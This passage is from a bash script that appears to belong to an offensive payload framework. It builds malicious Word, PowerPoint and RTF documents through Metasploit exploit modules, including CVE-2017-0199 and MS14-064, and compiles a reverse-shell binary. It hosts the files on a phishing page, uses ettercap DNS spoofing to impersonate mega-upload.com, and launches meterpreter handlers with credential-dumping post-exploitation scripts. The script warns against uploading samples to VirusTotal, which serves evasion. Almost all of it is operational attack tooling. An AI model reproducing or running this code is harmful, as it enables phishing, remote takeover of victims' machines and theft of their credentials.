      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        #
        # TODO: if used IEXdownload() in Invoke-Phant0m.rb then
        # cp $IPATH/aux/Invoke-Phant0m.ps1 $ApAcHe/Invoke-Phant0m.ps1 > /dev/null 2>&1
        #
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi

  elif [ "$P0" = "post_linux.rc" ]; then
    # store metasploit post exploit directory structure
    CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
    if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
      echo "[✔] wifi_dump_linux.rb -> found"
      sleep 2
    else
      echo "[x] wifi_dump_linux.rb -> not found"
      sleep 1
      echo "    copy post-module to msfdb .."
      cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

  else
    :
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


else

  echo "[x] Abort execution .."
  sleep 2
fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $ApAcHe/$N4m.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
rm $IPATH/output/routine > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}







sh_world () {
# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    |     This module builds microsoft world executable agents    |
    |        *  agents available: docm | ppsx | rtf  *            |
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 1
QuE=$(zenity --question --title "☠ MICROSOFT WORD PAYLOADS ☠" --text "run module?" --width 220) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

# module description
clear
cat << !

    ╔─────────────────╦───────────╦────────────╦──────────────────╗
    |  OPTIONS BUILD  | TARGET OS |   FORMAT   |      OUTPUT      |
    ╠─────────────────╩───────────╩────────────╩──────────────────╣
    | a - shellcode     multi OS     C,PYTHON       DOCM(word)    |
    | b - shellcode     windows      PYTHON         PPSX(word)    |
    | c - shellcode     windows      C              RTF(word)     |
    ╠─────────────────────────────────────────────────────────────╣
    |  M - return to main menu                                    |
    ╚─────────────────────────────────────────────────────────────╝

!
echo "[☠] Shellcode Generator"
sleep 1
echo -n "[➽] Chose Your Venom:"
read choice
case $choice in
a) sh_world23 ;;
b) sh_world24 ;;
c) sh_world25 ;;
M) sh_menu ;;
m) sh_menu ;;
*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_world ;;
esac

  else
   echo "[x] Abort execution .."
   sleep 2
   clear
 fi
}




# ---------------------------------------------------
# astrobaby word macro trojan payload (windows.c) OR
# exploit/multi/fileformat/office_word_macro (python)
# ---------------------------------------------------
sh_world23 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OS x" --width 305 --height 100) > /dev/null 2>&1


  # config rigth arch (payload+format)
  if [ "$Targ" = "WINDOWS" ]; then
    taa="0"
    orm="C"
    paa="windows/meterpreter/reverse_tcp"
  else
    taa="1"
    orm="PYTHON"
    paa="python/meterpreter/reverse_tcp"
  fi


# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : $orm -> $Targ
| PAYLOAD : $paa
|_AGENT   : $IPATH/output/$N4m.docm


!

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $IPATH/templates/astrobaby.c ]; then
      echo "[☠] astrobaby.c -> found!"
      sleep 2
   else
      echo "[☠] astrobaby.c -> not found!"
      exit
   fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# building template (windows systems)
if [ "$Targ" = "WINDOWS" ]; then
echo "[☠] editing/backup files .."
cp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1
cd $IPATH/templates
sed -i "s|LhOsT|$lhost|g" astrobaby.c
sed -i "s|lPoRt|$lport|g" astrobaby.c
sleep 2

# compiling template (windows systems)
echo "[☠] Compiling using mingw32 .."
sleep 2
# i686-w64-mingw32-gcc astr0baby.c -o payload.exe -lws2_32 -mwindows
$ComP astrobaby.c -o payload.exe -lws2_32 -mwindows
strip payload.exe > /dev/null 2>&1
mv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1
echo "[☠] Binary: $IPATH/output/$N4m.exe .."
cd $IPATH
sleep 2
fi



# use metasploit to build shellcode
echo "[☠] Generating MS_word document .."
sleep 2
if [ "$Targ" = "WINDOWS" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
fi

mv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1
echo "[☠] MS_word agent: $IPATH/output/$N4m.docm .."
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.docm\n\nchose how to deliver: $N4m.docm" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
        fi
      sleep 2


   else


if [ "$Targ" = "WINDOWS" ]; then
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
else
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 220) > /dev/null 2>&1
fi


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.docm|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.docm $ApAcHe/$N4m.docm > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.docm $ApAcHe/$N4m.docm
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/astrobaby[bk].c $IPATH/templates/astrobaby.c > /dev/nul 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/$N4m.docm > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}




# ---------------------------------------------------------------------
# ms14_064_packager_python
# Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013
# ---------------------------------------------------------------------
sh_world24 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1


# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PYTHON -> WINDOWS
| PAYLOAD : python/meterpreter/reverse_tcp
|_AGENT   : $IPATH/output/$N4m.ppsx


!

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $IPATH/templates/astrobaby.c ]; then
      echo "[☠] template -> found!"
      sleep 2
   else
      echo "[☠] template -> not found!"
      exit
   fi



# building template
echo "[☠] editing/backup files .."
sleep 2
if [ -e $H0m3/.msf4/local/$N4m.ppsx ]; then
rm $H0m3/.msf4/local/$N4m.ppsx > /dev/null 2>&1
fi


echo "[☠] Generating binary agent .."
sleep 2

# use metasploit to build shellcode
echo "[☠] Generating MS_word document .."
sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/ms14_064_packager_python; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set FILENAME $N4m.ppsx; set LHOST $lhost; set LPORT $lport; run; exit -y'" > /dev/null 2>&1
mv $H0m3/.msf4/local/$N4m.ppsx $IPATH/output/$N4m.ppsx > /dev/null 2>&1
echo "[☠] MS_word agent: $IPATH/output/$N4m.ppsx .."
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ppsx\n\nchose how to deliver: $N4m.ppsx" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.ppsx|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.ppsx $ApAcHe/$N4m.ppsx > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.ppsx $ApAcHe/$N4m.ppsx
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.ppsx > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ---------------------------------------------------------------------
# cve2017-0199
# ---------------------------------------------------------------------
sh_world25 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" --width 350 --height 230) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1


# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C,SSL/TLS -> WINDOWS(RTF)
| PAYLOAD : $paylo
|_AGENT   : $IPATH/output/$N4m.rtf
